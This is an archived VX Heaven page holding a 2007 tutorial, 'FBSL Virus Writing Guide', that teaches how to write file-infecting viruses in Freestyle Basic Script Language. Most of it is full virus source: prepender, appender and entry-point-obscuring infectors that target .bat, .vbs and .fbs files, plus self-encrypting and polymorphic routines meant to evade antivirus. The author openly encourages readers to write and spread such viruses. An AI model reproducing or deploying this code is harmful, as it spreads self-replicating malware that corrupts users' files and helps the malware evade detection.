<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Genetix 'FBSL Virus Writing Guide' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Genetix"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Genetix,FBSL Virus Writing Guide, sbuff, result, randint, code, lbreak, scindexat, szline, lenx, function, array, replace, encrypted, line, polymorphic, scfinalize"/>
<meta name="Description" content="At first FBSL looks alot like VB. It has some common Pascal, C functions too. It's in early stages, not YET supporting arrays.. But it was fun to write these code's in this language! Hope someone somewhere starts creating viruses with this! It's able to compile into exe files.. you could write a virus to infect exe files made with FBSL. I've not done that yet, I think this is enough, but would like to see that!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"cd684825ed40c3767e917e742a691f4e196dad44-1498756249-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vge00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>FBSL Virus Writing Guide</h1><p><a href="/lib/?lang=en&amp;author=Genetix"> Genetix</a><br/> <em><a href="/vx.php?fid=1528#f1528">Electrical Ordered Freedom #1</a></em><br/> <em>January 2007</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vge00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vge00">Back to index</a>] [<a href="/lib/vge00.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li>Infection:
<ul>
<li>Prepender &amp; adding trash</li>
<li>Appender</li>
<li>EPO</li>
</ul></li>
<li>Encryption:
<ul>
<li>Encryption, adding ascii codes</li>
</ul></li>
<li>Polymorphic:
<ul>
<li>Polymorphic, prepender &amp; adding trash</li>
<li>Polymorphic, letter case changing</li>
<li>Polymorphic, Variable changing</li>
<li>Polymorphic, Joining lines</li>
</ul></li>
<li>Other:
<ul>
<li>Polycryption *</li>
</ul></li>
</ul>
<p>About FBSL: 'Freestyle Basic Script Language'</p>
<p>At first FBSL looks alot like VB. It has some common Pascal, C functions too. It's in early stages, not YET supporting arrays.. But it was fun to write these code's in this language! Hope someone somewhere starts creating viruses with this! It's able to compile into exe files.. you could write a virus to infect exe files made with FBSL. I've not done that yet, I think this is enough, but would like to see that!</p>
<h2>Prepender &amp; PolyMorphic</h2>
<p>In this example i included the polymorphism. So instead of making another section just for adding trash-poly, i build it into the prepender. There are some more polymorphism tricks in this article.</p>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">#OPTION EXPLICIT<br/>
$AppType CONSOLE<br/>
#Genetix<br/>
'Polymorphic/prepender.. changes random lines to uppercase &amp; lowercase &amp; add's trash comments<br/>
<br/>
DIM %fp , %maxbuff = 100, $sBuff<br/>
DIM $x, %FileList, $j, %LINE, $op, $ss, %i<br/>
FileList = ScNew()<br/>
<br/>
Begin Const<br/>
&nbsp; &nbsp; InfMarker = &quot;#Genetix&quot;<br/>
&nbsp; &nbsp; InfEnd = &quot;#End&quot;<br/>
&nbsp; &nbsp; TrashMark = &quot;'&quot;<br/>
End Const<br/>
<br/>
x = FindFirst( &quot;*.*&quot; )<br/>
WHILE x &lt;&gt; &quot;&quot;<br/>
&nbsp; &nbsp; x = FindNext<br/>
&nbsp; &nbsp; ScAdd( FileList, x )<br/>
WEND<br/>
<br/>
FOR i = 1 TO ScGetCount(FileList)<br/>
&nbsp; &nbsp; RANDOMIZE<br/>
&nbsp; &nbsp; IF INSTR(scIndexAt( FileList, i ), &quot;.bat&quot;) THEN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; op = FileOpen( scIndexAt( FileList, i ), &quot;APPEND&quot; )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ss = FileLoad(scIndexAt( FileList, i ))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; IF InStr(ss, InfMarker) = &quot;&quot; Then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; j = FileOpen( scIndexAt( FileList, i ), &quot;OUTPUT&quot; )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; fp = Fileopen( COMMAND(1), binary_input )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sBuff = FileGets(fp, maxbuff)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IF sBuff = InfEnd THEN EXIT WHILE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IF LEFT( sBuff, - LEN(sBuff) + 2 ) &lt;&gt; TrashMark THEN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IF Randint(1, 3) = 3 THEN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sBuff = Lcase(sBuff)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ELSE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sBuff = Ucase(sBuff)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; END IF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IF Randint(1, 4) = 3 THEN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FilePrint( j, TrashMark &amp; Trash(Randint(20, 80)))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FilePrint( j, sBuff)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ELSE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FilePrint( j, sBuff)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; END IF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; END IF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; WEND<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FilePrint( j, crlf &amp; InfEnd)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FilePrint( op, ss)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Fileclose( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FileClose(j)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FileClose(op)<br/>
&nbsp; &nbsp; END IF<br/>
END IF<br/>
NEXT i<br/>
ScFinalize( FileList )<br/>
<br/>
pause<br/>
<br/>
function trash(%lenx)<br/>
dim $re<br/>
&nbsp; &nbsp; for i = 1 to val(lenx)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; re = re &amp; Chr(Randint(97,122))<br/>
&nbsp; &nbsp; next i<br/>
return re<br/>
end function<br/>
<br/>
#END<br/>
&nbsp;</div>
<p>The virus searches for a victim, it first opens itself and reads the entire victims code into a variable. After this it will open itself and and search from top to the 'end marker, then it does a random number looping throu the code and changing random lines to Ucase and Lcase, after that it add's trash to itself, infects the victim and.. it's all over.</p>
<h2>Appender for FBSL.</h2>
<p>we looove them!</p>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">'start<br/>
<br/>
OPTION EXPLICIT<br/>
#AppType CONSOLE<br/>
<br/>
DIM $line1, $line2, Code1 = ScNew(), Code2 = ScNew()<br/>
DIM %fp, %c, %i, %FileList, %x, %op<br/>
<br/>
BEGIN CONST<br/>
&nbsp; &nbsp; infEnd = &quot;'end&quot;<br/>
&nbsp; &nbsp; infStart = &quot;'start&quot;<br/>
END CONST<br/>
<br/>
x = FindFirst( &quot;*.vbs&quot; )<br/>
&nbsp; &nbsp;WHILE x &lt;&gt; &quot;&quot;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; x = FindNext<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ScAdd( FileList, x )<br/>
&nbsp; &nbsp;WEND<br/>
<br/>
FOR x = 1 TO ScGetCount(FileList)<br/>
<br/>
&nbsp; &nbsp; fp = Fileopen(COMMAND(1), INPUT )<br/>
&nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; line1 = FileInput(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; IF line1 = infStart THEN EXIT WHILE<br/>
&nbsp; &nbsp; WEND<br/>
<br/>
&nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $line1 = FileInput(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; IF line1 = infEnd THEN EXIT WHILE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ScAdd( Code2, line1 )<br/>
&nbsp; &nbsp; WEND<br/>
<br/>
&nbsp; &nbsp; Fileclose( fp )<br/>
<br/>
&nbsp; &nbsp; FOR c = 1 TO ScGetCount(code1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Other = Other &amp; crlf &amp; ScIndexAt( code1, c )<br/>
&nbsp; &nbsp; NEXT c<br/>
<br/>
&nbsp; &nbsp; FOR i = 1 TO ScGetCount(Code2)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; all = all &amp; crlf &amp; ScIndexAt( Code2, i )<br/>
&nbsp; &nbsp; NEXT i<br/>
<br/>
&nbsp; &nbsp; op = FileOpen( scIndexAt( FileList, x ), &quot;APPEND&quot; )<br/>
&nbsp; &nbsp; FilePrint(op, infStart &amp; crlf &amp; all &amp; crlf &amp; infEnd)<br/>
&nbsp; &nbsp; FileClose(op)<br/>
NEXT<br/>
<br/>
'end<br/>
&nbsp;</div>
<p>This explains itself, it's just like the prepender.. instead it seaches itself for 'start &amp; 'end then extracts the code and appends to the victims. That's all to say on this.</p>
<h2>EPO virus for the FBSL. </h2>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">'start<br/>
OPTION EXPLICIT<br/>
#AppType CONSOLE<br/>
DIM %fp , $sBuff, %code = ScNew(), %i, $all<br/>
DIM %self, $some, $ps, $LINE, %codeS = ScNew(), %x, $szLine<br/>
DIM $a, $b, codeB = ScNew(), %c, $Other, %j, $szLine, %r, %FileList = ScNew()<br/>
BEGIN CONST<br/>
&nbsp; &nbsp; final = &quot;end sub&quot;<br/>
&nbsp; &nbsp; infEnd = &quot;'end&quot;<br/>
&nbsp; &nbsp; infStart = &quot;'start&quot;<br/>
&nbsp; &nbsp; lBreak = crlf<br/>
&nbsp; &nbsp; ext = &quot;.fbs&quot;<br/>
END CONST<br/>
r = FindFirst( &quot;*.*&quot; )<br/>
WHILE x &lt;&gt; &quot;&quot;<br/>
&nbsp; &nbsp; r = FindNext<br/>
&nbsp; &nbsp; ScAdd( FileList, r )<br/>
WEND<br/>
FOR r = 1 TO ScGetCount(FileList)<br/>
&nbsp; &nbsp; IF INSTR(scIndexAt( FileList, r ), ext) THEN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; fp = Fileopen(scIndexAt( FileList, r ), INPUT )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sBuff = FileInput(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IF sBuff = final THEN EXIT WHILE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ScAdd( code, sBuff )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WEND<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sBuff = FileInput(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ScAdd( codeB, sBuff )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WEND<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Fileclose( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOR c = 1 TO ScGetCount(codeB)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Other = Other &amp; crlf &amp; ScIndexAt( codeB, c )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NEXT c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOR i = 1 TO ScGetCount(code)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; all = all &amp; crlf &amp; ScIndexAt( code, i )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NEXT i<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fp = FileOpen(COMMAND(1), INPUT)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; szLine = FileInput(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IF szLine = infStart THEN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b = szline<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EXIT WHILE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; END IF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WEND<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; szLine = FileInput(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IF szLine = infEnd THEN<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EXIT WHILE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ELSE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ScAdd( codeS, szLine )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; END IF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WEND<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FileClose(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOR x = 1 TO ScGetCount(codeS)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a = a &amp; crlf &amp; ScIndexAt( codeS, x )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NEXT x<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; some = all &amp; lBreak &amp; infStart &amp; lBreak &amp; a &amp; lBreak &amp; infEnd &amp; lBreak &amp; final &amp; lBreak &amp; Other<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j = FileOpen(scIndexAt( FileList, r ), &quot;OUTPUT&quot; )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FilePrint( j, some)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FileClose(j)<br/>
&nbsp; &nbsp; END IF<br/>
NEXT r<br/>
ScFinalize( code )<br/>
ScFinalize( codeS )<br/>
ScFinalize( codeB )<br/>
'end<br/>
&nbsp;</div>
<p>The virus first searches for &amp; creates an array-like list of all files in it's working dir. After this it checks the file extension for ".fbs" It then opens the file and searches line by line for "end sub" putting each line befor it into an array. the next step is to continue reading the file until EOF. After this is done the virus has the posision of the place to infect and it has the other half of the victims file to put back after infection. so now it needs to find itself! Command(1) is the pointer to any fbsl script, so it reads itself and searches for "start" then "end" and extracts the code between those markers (the virus code). then it stores all this stupid data into a variable. Opens the victim and infects her/him/it the pet dog......? easy!</p>
<h2>Encryption!</h2>
<p>Here is a simple way of encrypting some message.. or the entire virus itself!</p>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">#option Explicit<br/>
$AppType CONSOLE<br/>
Dim $code, $st, %i, $norm<br/>
<br/>
code = (&quot;y{rw})+qnuux+&quot;)<br/>
<br/>
for i = 1 to len(code)<br/>
norm = norm &amp; chr(asc(mid(code,i,1)) - 9)<br/>
next<br/>
<br/>
ExecLine(norm)<br/>
&nbsp;</div>
<p>Code variable holds the encrypted code that when decrypted will display a message. This is easy well known encryption by adding 9 to each ASCII character code. A + 9 = I</p>
<dl>
<dt><strong>ExecLine</strong></dt><dd>ExecLine function Executes the content of the variable holding the code at runtime.</dd>
</dl>
<h2>Polymorphic: Changing Ucase &amp; Lcase randomly</h2>
<p>This is a vary old method.. but anyway i want to include it here!</p>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">#oPtioN expliCIt<br/>
$apptyPe conSolE<br/>
DiM $coDe, %OPENOWn<br/>
<br/>
COdE = PolY(FilELOAD(cOMmand(1)))<br/>
<br/>
<br/>
fUNcTIon poLy(stR)<br/>
dim $TmP, %i, %q<br/>
raNDOmiZE<br/>
For I = 1 To STRLEn(STr)<br/>
&nbsp; &nbsp; &nbsp; iF RAnDint(1,2) = 2 THEn<br/>
&nbsp; &nbsp; &nbsp; TmP = tmP &amp; LcAse(MId(STR,i,1))<br/>
&nbsp; &nbsp; &nbsp; elsE<br/>
&nbsp; &nbsp; &nbsp; tMp = Tmp &amp; UcaSe(mid(sTR,i,1))<br/>
&nbsp; &nbsp; &nbsp; enD if<br/>
NExT<br/>
RetuRN tmp<br/>
eND FUNCtIoN<br/>
<br/>
OPeNoWN = FiLeOpeN(COmMaND(1), &quot;oUtPUt&quot; )<br/>
fiLEpRInt(oPENoWn, CodE)<br/>
fileCLose(openown)<br/>
&nbsp;</div>
<p>The virus opens itself into the poly function, the function loops the length of each line and with a random number decides what letter in that line should be Lcase'd - Ucase'd. Once this is finished the virus writes the new code into intself. It's useless for anti-virus but i still like it!</p>
<h2>Polymorphic: Variable name chanhing</h2>
<p>Due to this language not supporting arrays it was no other way but to use the following method to get this working.</p>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">#option Explicit<br/>
$AppType CONSOLE<br/>
<br/>
Dim Array = ScNew()<br/>
Dim %i, $result, %fp, $sBuff<br/>
Dim %p, $r, $NewCode, $OpenMe<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; fp = Fileopen(Command(1), INPUT )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; WHILE NOT Fileeof( fp )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sBuff = FileInput(fp)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ScAdd( Array, sBuff)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; wend<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Fileclose( fp )<br/>
<br/>
<br/>
for i = 1 to ScGetCount(Array)<br/>
&nbsp; &nbsp; result = result &amp; crlf &amp; ScIndexAt( Array, i )<br/>
next<br/>
<br/>
<br/>
NewCode = NameChange(result)<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; OpenMe = FileOpen(Command(1), &quot;OUTPUT&quot; )<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FilePrint( OpenMe, NewCode)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FileClose(OpenMe)<br/>
<br/>
function polymorph(%lenx)<br/>
dim $re<br/>
&nbsp; &nbsp; for i = 1 to val(lenx)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; re = re &amp; Chr(Randint(97,122))<br/>
&nbsp; &nbsp; next i<br/>
return re<br/>
end function<br/>
<br/>
function NameChange(code)<br/>
raNDOmiZE<br/>
result = replace(code,&quot;result&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;Array&quot;, polymorph(RandInt(5,10)))<br/>
result = replace(code,&quot;fp&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;NameChange&quot;, polymorph(RandInt(5,10)))<br/>
result = replace(code,&quot;sBuff&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;polymorph&quot;, polymorph(RandInt(5,10)))<br/>
result = replace(code,&quot;lenx&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;NewCode&quot;, polymorph(RandInt(5,10)))<br/>
result = replace(code,&quot;OpenMe&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;code&quot;, polymorph(RandInt(5,10)))<br/>
return result<br/>
End Function<br/>
&nbsp;</div>
<p>First the virus opens itself and read's line by line adding each line to the "string collection" it's the closest thing to arrays in FBSL. It then loops through the lines collected in the string collectiong joining each line to "result" variable. NewCode calles a function to replace each variable with a random set of letters with a random laengh 5 - 10, It then Now that NewCode has the modified code the virus opens itself for write access and inputs it's new code. simple!</p>
<h2>Polymorphic: Joining lines</h2>
<p>this can be improved.</p>
<p>I've not seen this used befor but here it is in fbsl.</p>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">option Explicit<br/>
#AppType CONSOLE<br/>
Dim $line1, &nbsp;Code2 = ScNew()<br/>
Dim %fp, %i, %op<br/>
fp = Fileopen(Command(1), Input )<br/>
While Not Fileeof( fp )<br/>
&nbsp; &nbsp;line1 = FileInput(fp) <br/>
&nbsp; &nbsp;ScAdd(Code2, line1)<br/>
Wend<br/>
Fileclose( fp )<br/>
Randomize<br/>
For i = 1 To ScGetCount(Code2)<br/>
&nbsp; &nbsp; if instr(ScIndexAt( Code2, i ), chr(58)) then <br/>
&nbsp; &nbsp; &nbsp; &nbsp; replace (ScIndexAt( Code2, i ), chr(58), chr(13) &amp; chr(10))<br/>
&nbsp; &nbsp; end if<br/>
&nbsp; &nbsp; if RandInt(1,8) = 3 then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; all = all &amp; chr(58) &amp; ScIndexAt( Code2, i )<br/>
&nbsp; &nbsp; else<br/>
&nbsp; &nbsp; &nbsp; &nbsp; all = all &amp; crlf &amp; ScIndexAt( Code2, i )<br/>
&nbsp; &nbsp;end if<br/>
Next i<br/>
op = FileOpen(Command(1), OUTPUT )<br/>
FilePrint(op, all)<br/>
FileClose(op)<br/>
&nbsp;</div>
<p>The code opens itelf and reads eachline into the string collection. It loops through each line in the string collection first seaching for ":" in the line and replacing them with a new line (like pressing the enter key) then it decides with a random number what lines to join together. Most languages support this, in fbsl it's the same as vbs, vb ect.. when that's done it writes the new code into itself. ok boooring, but i like it! <em>sings</em></p>
<h2>Polymorphic: Polycryption</h2>
<p>This is a cross between polymorphism &amp; encryption. Was just a random idea while playing with some encryption in C# Probably old method? not seen it befor thou. So here it is!</p>
<div class="fbsl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">#OPTION EXPLICIT<br/>
$AppType CONSOLE<br/>
<br/>
DIM $Code<br/>
<br/>
Code = x(&quot;uwnsy%'Utq~2Hw~uynts%g~?%Ljsjyn}'5&quot;) 'The encrypted code with key appended to it<br/>
<br/>
FUNCTION x($STR)<br/>
&nbsp; &nbsp; DIM $txt<br/>
&nbsp; &nbsp; DIM %rndKey<br/>
&nbsp; &nbsp; DIM $tmp<br/>
&nbsp; &nbsp; DIM $result<br/>
&nbsp; &nbsp; DIM $rtn<br/>
&nbsp; &nbsp; DIM $original<br/>
&nbsp; &nbsp; DIM $KEY<br/>
&nbsp; &nbsp; DIM $self<br/>
&nbsp; &nbsp; DIM $OpenMe<br/>
&nbsp; &nbsp; DIM %i<br/>
&nbsp; &nbsp; original = STR &nbsp;'original string must be stored so it knows what to replace!<br/>
<br/>
&nbsp; &nbsp; self = FileLoad(COMMAND(1)) &nbsp; 'load itself<br/>
<br/>
&nbsp; &nbsp; KEY = RIGHT(STR, 1) 'the key is stored at the end of the encrypted string, get the key! or shall we just guess it?<br/>
&nbsp; &nbsp; FOR i = 1 TO LEN(STR)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; rtn = rtn &amp; CHR(ASC(MID(STR, i, 1)) - VAL(KEY)) 'restore the encrypted string.. how else can i explain this line??<br/>
&nbsp; &nbsp; NEXT<br/>
&nbsp; &nbsp; rtn = MID(rtn, 1, LEN(rtn) - 1) 'take away the key from the string because it's junk at this point.<br/>
<br/>
&nbsp; &nbsp; ExecLine(rtn) 'execute the decrypted code<br/>
<br/>
&nbsp; &nbsp; RANDOMIZE<br/>
&nbsp; &nbsp; rndKey = RandInt(1, 4) 'create a new random key<br/>
&nbsp; &nbsp; FOR i = 1 TO LEN(rtn)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; tmp = tmp &amp; CHR(ASC(MID(rtn, i, 1)) + rndKey) 're-encrypt the code with the new key!<br/>
&nbsp; &nbsp; NEXT<br/>
&nbsp; &nbsp; result = tmp &amp; rndKey 'gives the encrypted code to the variable &quot;result&quot; and append's the key<br/>
<br/>
&nbsp; &nbsp; 'last, open itself, replace the decrypted code with the new encrypted code.. polymorphic &amp; encryption at the same time!<br/>
&nbsp; &nbsp; OpenMe = FileOpen(COMMAND(1), OUTPUT)<br/>
&nbsp; &nbsp; FilePrint(OpenMe, REPLACE(self, original, result))<br/>
&nbsp; &nbsp; FileClose(OpenMe)<br/>
<br/>
END FUNCTION<br/>
&nbsp;</div>
<p>yey i love this! i commented the code instead of writing to much here (being lazy again!)</p>
<p>I think im done with FBSL now.. so, hope you enjoy reading this &amp; go write some fbsl virus !!!</p>
<p>Now some comments to my friendly friends!~ in alphabetical order!</p>
<dl>
<dt>MikeAce</dt><dd>~YOU HAVE A G/F!!!!! lol</dd>
<dt>Retro</dt><dd>~thx for always helping me :) and not wanting sex for it...</dd>
<dt>SPTH</dt><dd>~because this "tutorial?" is kinda in the same format as he writes his.... but mine is better *laughs*</dd>
